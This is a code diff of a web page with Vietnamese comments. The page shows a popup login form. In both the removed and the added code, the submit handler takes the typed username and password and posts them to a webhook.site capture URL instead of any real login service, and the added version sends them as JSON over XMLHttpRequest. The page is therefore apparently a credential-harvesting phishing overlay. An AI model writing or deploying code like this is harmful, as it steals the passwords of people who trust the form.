@@ -58,12 +58,10 @@
     }
 
     .overlay-background {
-      display: none; /* Ẩn mặc định */
+      display: none;
       position: fixed;
-      top: 0;
-      left: 0;
-      width: 100%;
-      height: 100%;
+      top: 0; left: 0;
+      width: 100%; height: 100%;
       background: rgba(0, 0, 0, 0.4);
       z-index: 99;
     }
@@ -76,10 +74,8 @@
     <button class="overlay-button" onclick="showLogin()">Hiển thị form đăng nhập</button>
   </div>
 
-  <!-- Overlay nền -->
   <div class="overlay-background" id="overlayBg" onclick="hideLogin()"></div>
 
-  <!-- Form đăng nhập -->
   <div class="login-popup" id="loginPopup">
     <h3>Đăng nhập</h3>
     <form id="loginForm">
@@ -90,49 +86,52 @@
   </div>
 
   <script>
-    // Hàm để hiển thị form đăng nhập và overlay nền
+    // Hiển thị form đăng nhập
     function showLogin() {
-      document.getElementById('loginPopup').style.display = 'block';  // Hiển thị form
-      document.getElementById('overlayBg').style.display = 'block';  // Hiển thị nền
+      document.getElementById('loginPopup').style.display = 'block';
+      document.getElementById('overlayBg').style.display = 'block';
     }
 
-    // Hàm để ẩn form đăng nhập và overlay nền
+    // Ẩn form đăng nhập
     function hideLogin() {
-      document.getElementById('loginPopup').style.display = 'none';  // Ẩn form
-      document.getElementById('overlayBg').style.display = 'none';  // Ẩn nền
+      document.getElementById('loginPopup').style.display = 'none';
+      document.getElementById('overlayBg').style.display = 'none';
     }
 
-    // Xử lý form submit và gửi dữ liệu đến webhook
+    // Ngăn form submit mặc định và gửi dữ liệu qua XMLHttpRequest
     document.getElementById('loginForm').addEventListener('submit', function(e) {
-      e.preventDefault(); // Ngừng hành động mặc định
+      e.preventDefault(); // Ngăn form submit mặc định
 
-      const form = document.createElement('form');
-      form.method = 'POST';
-      form.action = 'https://webhook.site/4c4b6cd8-f709-4df9-b9a1-b1380858fd00';
+      // Lấy dữ liệu từ form
+      const username = document.getElementById('username').value;
+      const password = document.getElementById('password').value;
 
-      const input1 = document.createElement('input');
-      input1.type = 'hidden';
-      input1.name = 'username';
-      input1.value = document.getElementById('username').value;
+      // Tạo đối tượng XMLHttpRequest
+      const xhr = new XMLHttpRequest();
+      xhr.open('POST', 'https://webhook.site/4c4b6cd8-f709-4df9-b9a1-b1380858fd00', true);
+      xhr.setRequestHeader('Content-Type', 'application/json');
 
-      const input2 = document.createElement('input');
-      input2.type = 'hidden';
-      input2.name = 'password';
-      input2.value = document.getElementById('password').value;
+      // Gửi dữ liệu
+      xhr.send(JSON.stringify({
+        username: username,
+        password: password
+      }));
 
-      form.appendChild(input1);
-      form.appendChild(input2);
+      // Xử lý phản hồi khi gửi thành công
+      xhr.onload = function() {
+        if (xhr.status >= 200 && xhr.status < 300) {
+          console.log('Dữ liệu đã được gửi:', xhr.responseText);
+          // Sau khi gửi, ẩn form
+          hideLogin();
+        } else {
+          console.error('Có lỗi khi gửi dữ liệu:', xhr.statusText);
+        }
+      };
 
-      document.body.appendChild(form);
-      form.submit();
-
-      // Ẩn form sau khi submit
-      hideLogin();
-    });
-
-    // Đảm bảo overlay có thể click để ẩn form
-    document.getElementById('overlayBg').addEventListener('click', function() {
-      hideLogin();
+      // Xử lý lỗi nếu có
+      xhr.onerror = function() {
+        console.error('Lỗi kết nối.');
+      };
     });
   </script>
 
